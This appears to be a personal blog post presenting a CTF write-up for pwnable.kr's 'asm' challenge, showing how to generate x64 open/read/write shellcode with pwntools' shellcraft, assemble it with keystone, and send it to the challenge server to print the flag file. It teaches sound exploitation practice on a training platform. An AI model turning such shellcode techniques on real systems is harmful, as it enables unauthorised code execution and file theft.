<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Generating shellcode with pwntool’s shellcraft" /><meta property="og:locale" content="en" /><meta name="description" content="A beginner CTF challenge" /><meta property="og:description" content="A beginner CTF challenge" /><link rel="canonical" href="https://latsa99.github.io/posts/shellcraft/" /><meta property="og:url" content="https://latsa99.github.io/posts/shellcraft/" /><meta property="og:site_name" content="LaTsa’s Blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-24T14:14:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Generating shellcode with pwntool’s shellcraft" /><meta name="twitter:site" content="@LaTsa99" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"A beginner CTF challenge","headline":"Generating shellcode with pwntool’s shellcraft","dateModified":"2022-01-24T14:14:00+01:00","url":"https://latsa99.github.io/posts/shellcraft/","datePublished":"2022-01-24T14:14:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://latsa99.github.io/posts/shellcraft/"},"@context":"https://schema.org"}</script><title>Generating shellcode with pwntool's shellcraft | LaTsa's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="LaTsa's Blog"><meta name="application-name" content="LaTsa's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/41215524?s=400&u=915de6ca640e6bebb01d4f48f04deca6c85dd5bf&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">LaTsa's Blog</a></div><div class="site-subtitle font-italic">Computer Engineering student and Security Research intern</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/LaTsa99" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LaTsa99" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['laszlo.szapula','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Generating shellcode with pwntool's shellcraft</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Generating shellcode with pwntool's shellcraft</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">LaTsa</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-01-24 14:14:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 24, 2022, 2:14 PM +0100" >Jan 24</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1209 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><h1 id="a-beginner-ctf-challenge">A beginner CTF challenge</h1><p>Recently I decided to learn more about binary exploitation. I found <a href="http://pwnable.kr">pwnable.kr</a>, which is a platform containing pwn challenges with different difficulties. To warm up a little bit and to get to know this platform’s eco system I started solving the challenges in the ‘Toddler’s Bottle’ category, which is the easiest one. These are really for beginners, some of them are rather programming challenges. Then I came across the challenge named ‘asm’. When I logged into the machine I found besides the program code a readme file and another file with a very long name. The readme said that I should connect to port 9026 to start the real version of the program which can access the long named file. The program greets us with the following message:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
</pre></table></code></div></div><p>This means that we need to give a shellcode to the program which opens this long named file and outputs its contents, but only using the three listed syscalls. At first I tought there is no way I will write this shellcode with that long filename by hand, so I started to look for a tool that can do this for us. After some research I found about shellcraft, which is included in pwntools, that can create shellcode for different architectures very easily.</p><h1 id="solving-with-shellcraft">Solving with Shellcraft</h1><p><a href="https://docs.pwntools.com/en/stable/shellcraft.html">Shellcraft</a> is a shellcode module inside pwntools. It provides very simple ways to generate specific shellcodes. This module has different classes for different architectures and inside these classes there are methods which generate the desired assemblies. For example the <code class="language-plaintext highlighter-rouge">open()</code> method will generate a short instruction sequence that sets up the parameters and calls the <code class="language-plaintext highlighter-rouge">open</code> syscall. There are more complex methods too, for example <code class="language-plaintext highlighter-rouge">cat()</code>, which writes the content of a file to the standard output.</p><p>Since the challenge wants us to only use the <code class="language-plaintext highlighter-rouge">open</code>, <code class="language-plaintext highlighter-rouge">read</code> and <code class="language-plaintext highlighter-rouge">write</code> syscalls, we will need to use these three. The <code class="language-plaintext highlighter-rouge">cat()</code> method cannot be used here, since it uses the <code class="language-plaintext highlighter-rouge">sendfile</code> syscall. So let’s see the three parts of the shellcode.</p><p>The first part is the <code class="language-plaintext highlighter-rouge">open</code> syscall, which opens the file given in the parameter and returns its file descriptor number, which we can use to access the file later. The first parameter is the path to the file and the second parameter is the access mode. For the second parameter we need <code class="language-plaintext highlighter-rouge">O_RDONLY</code>, which is 0 in glibc. We can generate this instruction sequence the following way:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">open_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">open_sc</span><span class="p">)</span>
    <span class="o">/*</span> <span class="nb">open</span><span class="p">(</span><span class="nb">file</span><span class="o">=</span><span class="s">'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span><span class="p">,</span> <span class="n">oflag</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">push</span> <span class="sa">b</span><span class="s">'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x67</span>
    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x6e6f306f306f306f</span>
    <span class="n">push</span> <span class="n">rax</span>
    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x306f306f306f3030</span>
    <span class="n">push</span> <span class="n">rax</span>
    <span class="p">...</span>
    <span class="n">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="mh">0x695f736968742f2e</span>
    <span class="n">push</span> <span class="n">rax</span>
    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="n">xor</span> <span class="n">edx</span><span class="p">,</span> <span class="n">edx</span> <span class="o">/*</span> <span class="mi">0</span> <span class="o">*/</span>
    <span class="n">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span> <span class="o">/*</span> <span class="mi">0</span> <span class="o">*/</span>
    <span class="o">/*</span> <span class="n">call</span> <span class="nb">open</span><span class="p">()</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="n">SYS_open</span> <span class="o">/*</span> <span class="mi">2</span> <span class="o">*/</span>
    <span class="n">pop</span> <span class="n">rax</span>
    <span class="n">syscall</span>
</pre></table></code></div></div><p>As we can see it generates a bunch of mov and push instructions to put the filename to the stack, then puts the stack address in the first paramter, 0 (O_RDONLY) into the second and calls syscall number 2, which is <code class="language-plaintext highlighter-rouge">open</code>. But this form will not suffice, since the <code class="language-plaintext highlighter-rouge">SYS_open</code> symbol is unknown to the assembler, but with some python string magic we can replace that with the number 2.</p><p>The next sequence will call the <code class="language-plaintext highlighter-rouge">read</code> syscall, which requires the file descriptor of our opened file, a buffer to store the input and a size. The file descriptor will be returned in the rax register after the <code class="language-plaintext highlighter-rouge">open</code> syscall. To put that into the first parameter of the <code class="language-plaintext highlighter-rouge">read()</code> method we can simply write <code class="language-plaintext highlighter-rouge">'rax'</code> into the first parameter. Because we cannot really allocate memory for the input buffer, we can use the stack because we won’t use the file name anymore. We can put the rsp register in the second parameter the same way as rax. For the size parameter I wrote 30, usually flags are not longer than that and it is not a problem if it is longer than the content of the flag file, it will just return 0. This is how the generation looks like:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">read_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="s">'rax'</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">read_sc</span><span class="p">)</span>
    <span class="o">/*</span> <span class="n">call</span> <span class="n">read</span><span class="p">(</span><span class="s">'rax'</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">)</span> <span class="o">*/</span>
    <span class="n">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span>
    <span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span> <span class="o">/*</span> <span class="n">SYS_read</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mh">0x1e</span>
    <span class="n">pop</span> <span class="n">rdx</span>
    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="n">syscall</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">write</code> sequence will be just as easy. The first parameter requires the file descriptor where we want to write. We want to print the buffer to the standard output, so let’s set it to 1, which is the file descriptor of stdout. The second parameter is the pointer to the buffer from where we want to write. We put the content into the stack, so we can just set rsp as the second parameter with the <code class="language-plaintext highlighter-rouge">'rsp'</code> syntax. The third parameter is the length, which I set to 30 again. This is the last part of the shellcode:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="n">write_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span> 
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">write_sc</span><span class="p">)</span>
    <span class="o">/*</span> <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="o">=</span><span class="s">'rsp'</span><span class="p">,</span> <span class="n">n</span><span class="o">=</span><span class="mh">0x1e</span><span class="p">)</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="mi">1</span>
    <span class="n">pop</span> <span class="n">rdi</span>
    <span class="n">push</span> <span class="mh">0x1e</span>
    <span class="n">pop</span> <span class="n">rdx</span>
    <span class="n">mov</span> <span class="n">rsi</span><span class="p">,</span> <span class="n">rsp</span>
    <span class="o">/*</span> <span class="n">call</span> <span class="n">write</span><span class="p">()</span> <span class="o">*/</span>
    <span class="n">push</span> <span class="n">SYS_write</span> <span class="o">/*</span> <span class="mi">1</span> <span class="o">*/</span>
    <span class="n">pop</span> <span class="n">rax</span>
    <span class="n">syscall</span>
</pre></table></code></div></div><p>Here we will again need to replace the <code class="language-plaintext highlighter-rouge">SYS_write</code> string with the number 1, because we won’t have this symbol.</p><p>Now we need to somehow transform these strings into instruction bytes. For that we can use the <a href="https://www.keystone-engine.org/">keystone engine</a> in python. Here we only need to instantiate the <code class="language-plaintext highlighter-rouge">Ks</code> class setting it to 64 bit x86 architecture, and we can assemble the merged instructions.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">ks</span> <span class="o">=</span> <span class="n">Ks</span><span class="p">(</span><span class="n">KS_ARCH_X86</span><span class="p">,</span> <span class="n">KS_MODE_64</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">encoding</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="n">ks</span><span class="p">.</span><span class="n">asm</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">encoding</span><span class="p">)</span>
<span class="p">[</span><span class="mi">106</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="p">...]</span>
</pre></table></code></div></div><p>We now only need to merge the bytes into a bytes variable, then we can send it to the target. Here is the full script:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">keystone</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">open_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="s">'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'</span><span class="p">,</span> <span class="mi">0</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'SYS_open'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
<span class="n">read_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="s">'rax'</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
<span class="n">write_sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">amd64</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'rsp'</span><span class="p">,</span> <span class="mi">30</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'SYS_write'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>


<span class="n">assembly</span> <span class="o">=</span> <span class="n">open_sc</span> <span class="o">+</span> <span class="n">read_sc</span> <span class="o">+</span> <span class="n">write_sc</span>


<span class="n">ks</span> <span class="o">=</span> <span class="n">Ks</span><span class="p">(</span><span class="n">KS_ARCH_X86</span><span class="p">,</span> <span class="n">KS_MODE_64</span><span class="p">)</span>
<span class="n">encoding</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="n">ks</span><span class="p">.</span><span class="n">asm</span><span class="p">(</span><span class="n">assembly</span><span class="p">)</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">encoding</span><span class="p">:</span>
    <span class="n">shellcode</span> <span class="o">+=</span> <span class="n">i</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwnable.kr'</span><span class="p">,</span> <span class="mi">9026</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'give me your x64 shellcode: '</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'[+] Flag: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s">'</span><span class="p">)</span> 
</pre></table></code></div></div><p>If we run this, we will get the flag.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$ ./expl.py 
[+] Opening connection to pwnable.kr on port 9026: Done
[+] Flag: [---FLAG---]

[*] Closed connection to pwnable.kr port 9026
</pre></table></code></div></div><p>Although this was a beginner challenge, it made me learn a very powerful tool which I have not heard of before. With shellcraft later harder challenges can be solved more easily than just writing bytes by hand.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/binary-exploitation/'>Binary Exploitation</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration" >pwntools</a> <a href="/tags/shellcraft/" class="post-tag no-text-decoration" >shellcraft</a> <a href="/tags/pwnable-kr/" class="post-tag no-text-decoration" >pwnable.kr</a> <a href="/tags/asm/" class="post-tag no-text-decoration" >asm</a> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/keystone/" class="post-tag no-text-decoration" >keystone</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Generating shellcode with pwntool's shellcraft - LaTsa's Blog&url=https://latsa99.github.io/posts/shellcraft/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Generating shellcode with pwntool's shellcraft - LaTsa's Blog&u=https://latsa99.github.io/posts/shellcraft/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Generating shellcode with pwntool's shellcraft - LaTsa's Blog&url=https://latsa99.github.io/posts/shellcraft/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/arm64/">arm64</a> <a class="post-tag" href="/tags/asm/">asm</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/exploitation/">exploitation</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/keystone/">keystone</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/pwnable-kr/">pwnable.kr</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/kernel/"><div class="card-body"> <em class="timeago small" date="2022-02-03 18:19:00 +0100" >Feb 3</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>About my kernel pwn repository</h3><div class="text-muted small"><p> In the spring semester of 2021, I had to do a semester project at the university. This course is about finding a specialization-related topic and an advisor, then the student needs to work on that ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></span> <a href="/posts/kernel/" class="btn btn-outline-primary" prompt="Newer"><p>About my kernel pwn repository</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">LaTsa</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex 